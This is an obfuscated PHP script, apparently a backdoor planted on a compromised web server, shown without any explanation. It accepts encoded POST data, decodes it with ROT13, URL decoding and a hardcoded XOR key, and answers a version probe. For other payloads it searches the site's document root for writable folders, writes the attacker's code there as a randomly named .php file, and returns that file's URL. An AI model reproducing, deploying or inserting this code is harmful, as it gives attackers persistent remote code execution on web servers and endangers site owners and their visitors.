<?php $lsnfc = "cjnmzssnrtgqjamp";$rndydaf = "";foreach ($_POST as $pubepi => $rfshyv){if (strlen($pubepi) == 16 and substr_count($rfshyv, "%") > 10){gczftfl($pubepi, $rfshyv);}}function gczftfl($pubepi, $ntbzdpzl){global $rndydaf;$rndydaf = $pubepi;$ntbzdpzl = str_split(rawurldecode(str_rot13($ntbzdpzl)));function uaecbvla($cbuitmigrs, $pubepi){global $lsnfc, $rndydaf;return $cbuitmigrs ^ $lsnfc[$pubepi % strlen($lsnfc)] ^ $rndydaf[$pubepi % strlen($rndydaf)];}$ntbzdpzl = implode("", array_map("uaecbvla", array_values($ntbzdpzl), array_keys($ntbzdpzl)));$ntbzdpzl = @unserialize($ntbzdpzl);if (@is_array($ntbzdpzl)){$pubepi = array_keys($ntbzdpzl);$ntbzdpzl = $ntbzdpzl[$pubepi[0]];if ($ntbzdpzl === $pubepi[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function pdtfuw($izagfxir) {static $eucausd = array();$jedso = glob($izagfxir . '/*', GLOB_ONLYDIR);if (count($jedso) > 0) {foreach ($jedso as $izagfx){if (@is_writable($izagfx)){$eucausd[] = $izagfx;}}}foreach ($jedso as $izagfxir) pdtfuw($izagfxir);return $eucausd;}$tcudqglxpp = $_SERVER["DOCUMENT_ROOT"];$jedso = pdtfuw($tcudqglxpp);$pubepi = array_rand($jedso);$icejihuke = $jedso[$pubepi] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($icejihuke, $ntbzdpzl);echo "http://" . $_SERVER["HTTP_HOST"] . substr($icejihuke, strlen($tcudqglxpp));exit();}}}